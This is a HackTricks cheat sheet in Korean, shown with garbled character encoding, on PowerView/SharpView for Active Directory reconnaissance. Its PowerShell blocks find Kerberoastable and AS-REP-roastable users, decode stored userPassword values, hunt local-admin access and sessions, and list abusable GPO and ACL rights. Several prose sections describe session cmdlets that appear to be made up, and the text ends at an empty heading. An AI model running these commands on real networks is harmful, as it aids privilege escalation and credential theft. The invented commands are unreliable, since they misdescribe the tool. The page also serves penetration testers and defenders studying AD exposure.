# PowerView/SharpView

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ ì œë¡œë¶€í„° AWS í•´í‚¹ì„ ì „ë¬¸ê°€ë¡œ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ **í•˜ê±°ë‚˜ **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤**í•˜ê±°ë‚˜ HackTricksë¥¼ **PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•´ë³´ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter**ì—ì„œ ì €ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš” ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)ì™€ [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**ì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ìˆ ì„ ê³µìœ í•˜ì„¸ìš”.

</details>

PowerViewì˜ ê°€ì¥ ìµœì‹  ë²„ì „ì€ í•­ìƒ PowerSploitì˜ dev ë¸Œëœì¹˜ì— ìˆìŠµë‹ˆë‹¤: [https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

[**SharpView**](https://github.com/tevora-threat/SharpView)ëŠ” [**PowerView**](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)ì˜ .NET í¬íŠ¸ì…ë‹ˆë‹¤.

### ë¹ ë¥¸ ì—´ê±°
```powershell
Get-NetDomain #Basic domain info
#User info
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount #Basic user enabled info
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN #Kerberoastable users
#Groups info
Get-NetGroup | select samaccountname, admincount, description
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=EGOTISTICAL-BANK,DC=local' | %{ $_.SecurityIdentifier } | Convert-SidToName #Get AdminSDHolders
#Computers
Get-NetComputer | select samaccountname, operatingsystem
Get-NetComputer -Unconstrainusered | select samaccountname #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth | select samaccountname #Find computers with Constrained Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups
#Shares
Find-DomainShare -CheckShareAccess #Search readable shares
#Domain trusts
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
#LHF
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess
#Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.
Invoke-UserHunter -CheckAccess
#Find interesting ACLs
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | fl
```
### ë„ë©”ì¸ ì •ë³´

```powershell
Get-Domain
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì— ëŒ€í•œ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ í˜„ì¬ ì‚¬ìš©ìê°€ ì†í•œ ë„ë©”ì¸ì˜ ì´ë¦„, SID, í¬ë¦¬ìŠ¤íŠ¸ ì´ë¦„, í¬ë¦¬ìŠ¤íŠ¸ SID ë“±ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-DomainController
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ë„ë©”ì¸ ì»¨íŠ¸ë¡¤ëŸ¬ì— ëŒ€í•œ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ë„ë©”ì¸ ì»¨íŠ¸ë¡¤ëŸ¬ì˜ ì´ë¦„, IP ì£¼ì†Œ, ìš´ì˜ ì²´ì œ ë²„ì „ ë“±ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-DomainPolicy
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ê·¸ë£¹ ì •ì±…ì— ëŒ€í•œ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ê·¸ë£¹ ì •ì±…ì˜ ì´ë¦„, GPO ID, ì ìš© ë²”ìœ„ ë“±ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-DomainTrust
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ê³¼ ì‹ ë¢° ê´€ê³„ì— ìˆëŠ” ë„ë©”ì¸ì— ëŒ€í•œ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì‹ ë¢° ê´€ê³„ ë„ë©”ì¸ì˜ ì´ë¦„, SID, ì‹ ë¢° ê´€ê³„ ìœ í˜• ë“±ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-DomainUser
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ì‚¬ìš©ìì— ëŒ€í•œ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì‚¬ìš©ìì˜ ì´ë¦„, SID, ê³„ì • ìƒíƒœ ë“±ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-DomainGroup
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ê·¸ë£¹ì— ëŒ€í•œ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ê·¸ë£¹ì˜ ì´ë¦„, SID, ê·¸ë£¹ ìœ í˜• ë“±ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-DomainComputer
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ì»´í“¨í„°ì— ëŒ€í•œ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì»´í“¨í„°ì˜ ì´ë¦„, SID, ìš´ì˜ ì²´ì œ ë²„ì „ ë“±ì„ í‘œì‹œí•©ë‹ˆë‹¤.
```powershell
# Domain Info
Get-Domain #Get info about the current domain
Get-NetDomain #Get info about the current domain
Get-NetDomain -Domain mydomain.local
Get-DomainSID #Get domain SID

# Policy
Get-DomainPolicy #Get info about the policy
(Get-DomainPolicy)."KerberosPolicy" #Kerberos tickets info(MaxServiceAge)
(Get-DomainPolicy)."SystemAccess" #Password policy
Get-DomainPolicyData | select -ExpandProperty SystemAccess #Same as previous
(Get-DomainPolicy).PrivilegeRights #Check your privileges
Get-DomainPolicyData # Same as Get-DomainPolicy

# Domain Controller
Get-DomainController | select Forest, Domain, IPAddress, Name, OSVersion | fl # Get specific info of current domain controller
Get-NetDomainController -Domain mydomain.local #Get all ifo of specific domain Domain Controller

# Get Forest info
Get-ForestDomain
```
### ì‚¬ìš©ì, ê·¸ë£¹, ì»´í“¨í„° ë° OU

PowerViewëŠ” Windows í™˜ê²½ì—ì„œ ì‚¬ìš©ì, ê·¸ë£¹, ì»´í“¨í„° ë° OU(ì¡°ì§ ë‹¨ìœ„)ì™€ ê´€ë ¨ëœ ì •ë³´ë¥¼ ì‰½ê²Œ ìˆ˜ì§‘í•  ìˆ˜ ìˆëŠ” ê°•ë ¥í•œ ë„êµ¬ì…ë‹ˆë‹¤. ì´ ì •ë³´ë¥¼ ìˆ˜ì§‘í•˜ë©´ ë„¤íŠ¸ì›Œí¬ í™˜ê²½ì„ ë¶„ì„í•˜ê³  ë³´ì•ˆ ì·¨ì•½ì ì„ ì‹ë³„í•˜ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤.

#### ì‚¬ìš©ì ì •ë³´ ìˆ˜ì§‘

PowerViewë¥¼ ì‚¬ìš©í•˜ì—¬ ë„ë©”ì¸ ë‚´ì˜ ëª¨ë“  ì‚¬ìš©ì ê³„ì •ì„ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•˜ë©´ ë©ë‹ˆë‹¤.

```powershell
Get-NetUser
```

#### ê·¸ë£¹ ì •ë³´ ìˆ˜ì§‘

PowerViewë¥¼ ì‚¬ìš©í•˜ì—¬ ë„ë©”ì¸ ë‚´ì˜ ëª¨ë“  ê·¸ë£¹ì„ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•˜ë©´ ë©ë‹ˆë‹¤.

```powershell
Get-NetGroup
```

#### ì»´í“¨í„° ì •ë³´ ìˆ˜ì§‘

PowerViewë¥¼ ì‚¬ìš©í•˜ì—¬ ë„ë©”ì¸ ë‚´ì˜ ëª¨ë“  ì»´í“¨í„°ë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•˜ë©´ ë©ë‹ˆë‹¤.

```powershell
Get-NetComputer
```

#### OU ì •ë³´ ìˆ˜ì§‘

PowerViewë¥¼ ì‚¬ìš©í•˜ì—¬ ë„ë©”ì¸ ë‚´ì˜ ëª¨ë“  OUë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•˜ë©´ ë©ë‹ˆë‹¤.

```powershell
Get-NetOU
```

PowerViewë¥¼ ì‚¬ìš©í•˜ë©´ ì´ëŸ¬í•œ ì •ë³´ë¥¼ ì‰½ê²Œ ìˆ˜ì§‘í•  ìˆ˜ ìˆìœ¼ë©°, ì´ë¥¼ í†µí•´ ë„¤íŠ¸ì›Œí¬ í™˜ê²½ì„ ë¶„ì„í•˜ê³  ë³´ì•ˆ ì·¨ì•½ì ì„ ì‹ë³„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```powershell
# Users
## Get usernames and their groups
Get-DomainUser -Properties name, MemberOf | fl
## Get-DomainUser and Get-NetUser are kind of the same
Get-NetUser #Get users with several (not all) properties
Get-NetUser | select samaccountname, description, pwdlastset, logoncount, badpwdcount #List all usernames
Get-NetUser -UserName student107 #Get info about a user
Get-NetUser -properties name, description #Get all descriptions
Get-NetUser -properties name, pwdlastset, logoncount, badpwdcount  #Get all pwdlastset, logoncount and badpwdcount
Find-UserField -SearchField Description -SearchTerm "built" #Search account with "something" in a parameter
# Get users with reversible encryption (PWD in clear text with dcsync)
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

# Users Filters
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -properties distinguishedname #All enabled users
Get-NetUser -UACFilter ACCOUNTDISABLE #All disabled users
Get-NetUser -UACFilter SMARTCARD_REQUIRED #Users that require a smart card
Get-NetUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname #Not smart card users
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
Get-Netuser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto #Constrained Resource Delegation
Get-NetUser -AllowDelegation -AdminCount #All privileged users that aren't marked as sensitive/not for delegation
# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-ObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}
# Users with PASSWD_NOTREQD set in the userAccountControl means that the user is not subject to the current password policy
## Users with this flag might have empty passwords (if allowed) or shorter passwords
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

#Groups
Get-DomainGroup | where Name -like "*Admin*" | select SamAccountName
## Get-DomainGroup is similar to Get-NetGroup
Get-NetGroup #Get groups
Get-NetGroup -Domain mydomain.local #Get groups of an specific domain
Get-NetGroup 'Domain Admins' #Get all data of a group
Get-NetGroup -AdminCount | select name,memberof,admincount,member | fl #Search admin grups
Get-NetGroup -UserName "myusername" #Get groups of a user
Get-NetGroupMember -Identity "Administrators" -Recurse #Get users inside "Administrators" group. If there are groups inside of this grup, the -Recurse option will print the users inside the others groups also
Get-NetGroupMember -Identity "Enterprise Admins" -Domain mydomain.local #Remember that "Enterprise Admins" group only exists in the rootdomain of the forest
Get-NetLocalGroup -ComputerName dc.mydomain.local -ListGroups #Get Local groups of a machine (you need admin rights in no DC hosts)
Get-NetLocalGroupMember -computername dcorp-dc.dollarcorp.moneycorp.local #Get users of localgroups in computer
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs #Check AdminSDHolder users
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} #Get ObjectACLs by sid
Get-NetGPOGroup #Get restricted groups

# Computers
Get-DomainComputer -Properties DnsHostName # Get all domain maes of computers
## Get-DomainComputer is kind of the same as Get-NetComputer
Get-NetComputer #Get all computer objects
Get-NetComputer -Ping #Send a ping to check if the computers are working
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth #Find computers with Constrined Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups

#OU
Get-DomainOU -Properties Name | sort -Property Name #Get names of OUs
Get-DomainOU "Servers" | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties Name} #Get all computers inside an OU (Servers in this case)
## Get-DomainOU is kind of the same as Get-NetOU
Get-NetOU #Get Organization Units
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_} #Get all computers inside an OU (StudentMachines in this case)
```
### ë¡œê·¸ì˜¨ ë° ì„¸ì…˜

PowerViewëŠ” ë¡œê·¸ì˜¨ ë° ì„¸ì…˜ ê´€ë ¨ ì •ë³´ë¥¼ ìˆ˜ì§‘í•˜ê³  ì¡°ì‘í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë‹¤ì–‘í•œ ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤.

#### Get-NetLoggedon

`Get-NetLoggedon`ì€ í˜„ì¬ ë„ë©”ì¸ ì»¨íŠ¸ë¡¤ëŸ¬ì— ë¡œê·¸ì˜¨í•œ ì‚¬ìš©ìì˜ ëª©ë¡ì„ ê°€ì ¸ì˜µë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì‚¬ìš©ì ì´ë¦„, ì»´í“¨í„° ì´ë¦„, ë¡œê·¸ì˜¨ ì‹œê°„ ë° ë¡œê·¸ì˜¨ ìœ í˜•ê³¼ ê°™ì€ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

```powershell
Get-NetLoggedon
```

#### Get-NetSession

`Get-NetSession`ì€ í˜„ì¬ ë„ë©”ì¸ ì»¨íŠ¸ë¡¤ëŸ¬ì—ì„œ í™œì„±í™”ëœ ì„¸ì…˜ì˜ ëª©ë¡ì„ ê°€ì ¸ì˜µë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì‚¬ìš©ì ì´ë¦„, ì»´í“¨í„° ì´ë¦„, ì„¸ì…˜ ID, ì„¸ì…˜ ìƒíƒœ ë° ì„¸ì…˜ ì¢…ë¥˜ì™€ ê°™ì€ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

```powershell
Get-NetSession
```

#### Get-NetSessionComputer

`Get-NetSessionComputer`ì€ íŠ¹ì • ì»´í“¨í„°ì—ì„œ í™œì„±í™”ëœ ì„¸ì…˜ì˜ ëª©ë¡ì„ ê°€ì ¸ì˜µë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì‚¬ìš©ì ì´ë¦„, ì»´í“¨í„° ì´ë¦„, ì„¸ì…˜ ID, ì„¸ì…˜ ìƒíƒœ ë° ì„¸ì…˜ ì¢…ë¥˜ì™€ ê°™ì€ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

```powershell
Get-NetSessionComputer -ComputerName <ComputerName>
```

#### Get-NetSessionUser

`Get-NetSessionUser`ëŠ” íŠ¹ì • ì‚¬ìš©ìê°€ ë¡œê·¸ì˜¨í•œ ëª¨ë“  ì»´í“¨í„°ì—ì„œ í™œì„±í™”ëœ ì„¸ì…˜ì˜ ëª©ë¡ì„ ê°€ì ¸ì˜µë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì‚¬ìš©ì ì´ë¦„, ì»´í“¨í„° ì´ë¦„, ì„¸ì…˜ ID, ì„¸ì…˜ ìƒíƒœ ë° ì„¸ì…˜ ì¢…ë¥˜ì™€ ê°™ì€ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

```powershell
Get-NetSessionUser -UserName <UserName>
```

#### Get-NetSessionDomain

`Get-NetSessionDomain`ì€ íŠ¹ì • ë„ë©”ì¸ì—ì„œ í™œì„±í™”ëœ ì„¸ì…˜ì˜ ëª©ë¡ì„ ê°€ì ¸ì˜µë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì‚¬ìš©ì ì´ë¦„, ì»´í“¨í„° ì´ë¦„, ì„¸ì…˜ ID, ì„¸ì…˜ ìƒíƒœ ë° ì„¸ì…˜ ì¢…ë¥˜ì™€ ê°™ì€ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

```powershell
Get-NetSessionDomain -Domain <DomainName>
```

#### Get-NetSessionGroup

`Get-NetSessionGroup`ì€ íŠ¹ì • ê·¸ë£¹ì— ì†í•œ ì‚¬ìš©ìê°€ ë¡œê·¸ì˜¨í•œ ëª¨ë“  ì»´í“¨í„°ì—ì„œ í™œì„±í™”ëœ ì„¸ì…˜ì˜ ëª©ë¡ì„ ê°€ì ¸ì˜µë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì‚¬ìš©ì ì´ë¦„, ì»´í“¨í„° ì´ë¦„, ì„¸ì…˜ ID, ì„¸ì…˜ ìƒíƒœ ë° ì„¸ì…˜ ì¢…ë¥˜ì™€ ê°™ì€ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

```powershell
Get-NetSessionGroup -GroupName <GroupName>
```

#### Get-NetSessionID

`Get-NetSessionID`ëŠ” íŠ¹ì • ì„¸ì…˜ IDë¥¼ ê°€ì§„ ì„¸ì…˜ì˜ ì •ë³´ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì‚¬ìš©ì ì´ë¦„, ì»´í“¨í„° ì´ë¦„, ì„¸ì…˜ ID, ì„¸ì…˜ ìƒíƒœ ë° ì„¸ì…˜ ì¢…ë¥˜ì™€ ê°™ì€ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

```powershell
Get-NetSessionID -SessionID <SessionID>
```

#### Get-NetSessionIDUser

`Get-NetSessionIDUser`ëŠ” íŠ¹ì • ì‚¬ìš©ìê°€ ë¡œê·¸ì˜¨í•œ ëª¨ë“  ì»´í“¨í„°ì—ì„œ íŠ¹ì • ì„¸ì…˜ IDë¥¼ ê°€ì§„ ì„¸ì…˜ì˜ ì •ë³´ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì‚¬ìš©ì ì´ë¦„, ì»´í“¨í„° ì´ë¦„, ì„¸ì…˜ ID, ì„¸ì…˜ ìƒíƒœ ë° ì„¸ì…˜ ì¢…ë¥˜ì™€ ê°™ì€ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

```powershell
Get-NetSessionIDUser -SessionID <SessionID> -UserName <UserName>
```

#### Get-NetSessionIDComputer

`Get-NetSessionIDComputer`ëŠ” íŠ¹ì • ì»´í“¨í„°ì—ì„œ íŠ¹ì • ì„¸ì…˜ IDë¥¼ ê°€ì§„ ì„¸ì…˜ì˜ ì •ë³´ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì‚¬ìš©ì ì´ë¦„, ì»´í“¨í„° ì´ë¦„, ì„¸ì…˜ ID, ì„¸ì…˜ ìƒíƒœ ë° ì„¸ì…˜ ì¢…ë¥˜ì™€ ê°™ì€ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

```powershell
Get-NetSessionIDComputer -SessionID <SessionID> -ComputerName <ComputerName>
```
```powershell
Get-NetLoggedon -ComputerName <servername> #Get net logon users at the moment in a computer (need admins rights on target)
Get-NetSession -ComputerName <servername> #Get active sessions on the host
Get-LoggedOnLocal -ComputerName <servername> #Get locally logon users at the moment (need remote registry (default in server OS))
Get-LastLoggedon -ComputerName <servername> #Get last user logged on (needs admin rigths in host)
Get-NetRDPSession -ComputerName <servername> #List RDP sessions inside a host (needs admin rights in host)
```
### ê·¸ë£¹ ì •ì±… ê°œì²´ - GPOs

ë§Œì•½ ê³µê²©ìê°€ GPOì— ëŒ€í•œ **ë†’ì€ ê¶Œí•œ**ì„ ê°€ì§€ê³  ìˆë‹¤ë©´, ê·¸ëŠ” **ì‚¬ìš©ìì—ê²Œ ê¶Œí•œì„ ì¶”ê°€**í•˜ê±°ë‚˜, í˜¸ìŠ¤íŠ¸ì— **ë¡œì»¬ ê´€ë¦¬ì ì‚¬ìš©ìë¥¼ ì¶”ê°€**í•˜ê±°ë‚˜, ì¦‰ê°ì ìœ¼ë¡œ **ì‘ì—…ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ ì˜ˆì•½ëœ ì‘ì—…ì„ ìƒì„±**í•¨ìœ¼ë¡œì¨ ì´ë¥¼ ì•…ìš©í•˜ì—¬ **ê¶Œí•œ ìƒìŠ¹**ì„ í•  ìˆ˜ ìˆì„ ê²ƒì…ë‹ˆë‹¤.\
[**ìì„¸í•œ ì •ë³´ ë° ì•…ìš© ë°©ë²•ì€ ì´ ë§í¬ë¥¼ ë”°ë¥´ì„¸ìš”**](../active-directory-methodology/acl-persistence-abuse/#gpo-delegation).
```powershell
#GPO
Get-DomainGPO | select displayName #Check the names for info
Get-NetGPO #Get all policies with details
Get-NetGPO | select displayname #Get the names of the policies
Get-NetGPO -ComputerName <servername> #Get the policy applied in a computer
gpresult /V #Get current policy

# Get who can create new GPOs
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=invented,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# Enumerate permissions for GPOs where users with RIDs of > 1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')} | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# Get permissions a user/group has over any GPO
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

# COnvert GPO GUID to name
Get-GPO -Guid 18E5A689-E67F-90B2-1953-198ED4A7F532

# Transform SID to name
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1126

# Get GPO of an OU
Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}'

# Returns all GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences.
Get-DomainGPOLocalGroup | select GPODisplayName, GroupName, GPOType

# Enumerates the machines where a specific domain user/group is a member of a specific local group.
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName
```
**ACL (Access Control List)**ì€ íŒŒì¼ ì‹œìŠ¤í…œì´ë‚˜ ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ê´€ë¦¬í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ë©”ì»¤ë‹ˆì¦˜ì…ë‹ˆë‹¤. ACLì€ ê°œë³„ ì‚¬ìš©ì ë˜ëŠ” ê·¸ë£¹ì— ëŒ€í•œ íŠ¹ì • ì‘ì—…(ì½ê¸°, ì“°ê¸°, ì‹¤í–‰ ë“±)ì„ í—ˆìš©í•˜ê±°ë‚˜ ê±°ë¶€í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.

ACLì„ ì´ìš©í•˜ì—¬ GPOsì™€ ACLsì˜ ê¶Œí•œì„ ì•…ìš©í•˜ëŠ” ë°©ë²•ì„ ë°°ìš°ë ¤ë©´ ë‹¤ìŒì„ ì°¸ì¡°í•˜ì„¸ìš”:

{% content-ref url="../active-directory-methodology/acl-persistence-abuse/" %}
[acl-persistence-abuse](../active-directory-methodology/acl-persistence-abuse/)
{% endcontent-ref %}

### ACL
```powershell
#Get ACLs of an object (permissions of other objects over the indicated one)
Get-ObjectAcl -SamAccountName <username> -ResolveGUIDs

#Other way to get ACLs of an object
$sid = Convert-NameToSid <username/group>
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

#Get permissions of a file
Get-PathAcl -Path "\\dc.mydomain.local\sysvol"

#Find intresting ACEs (Interesting permisions of "unexpected objects" (RID>1000 and modify permissions) over other objects
Find-InterestingDomainAcl -ResolveGUIDs

#Check if any of the interesting permissions founds is realated to a username/group
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}

#Get special rights over All administrators in domain
Get-NetGroupMember -GroupName "Administrators" -Recurse | ?{$_.IsGroup -match "false"} | %{Get-ObjectACL -SamAccountName $_.MemberName -ResolveGUIDs} | select ObjectDN, IdentityReference, ActiveDirectoryRights
```
### ê³µìœ  íŒŒì¼ ë° í´ë”

PowerViewëŠ” ë„¤íŠ¸ì›Œí¬ì—ì„œ ê³µìœ  íŒŒì¼ ë° í´ë”ë¥¼ ì‹ë³„í•˜ê³  ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ í™•ì¸í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### Get-NetShare

`Get-NetShare` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì—ì„œ ê³µìœ ëœ í´ë”ë¥¼ ë‚˜ì—´í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ê³µìœ  ì´ë¦„, ê²½ë¡œ, ì„¤ëª… ë° ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetShare
```

#### Get-NetLoggedon

`Get-NetLoggedon` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì— ë¡œê·¸ì˜¨í•œ ì‚¬ìš©ìë¥¼ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì‚¬ìš©ì ì´ë¦„, ë„ë©”ì¸, SID ë° ë¡œê·¸ì˜¨ ì‹œê°„ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetLoggedon
```

#### Get-NetSession

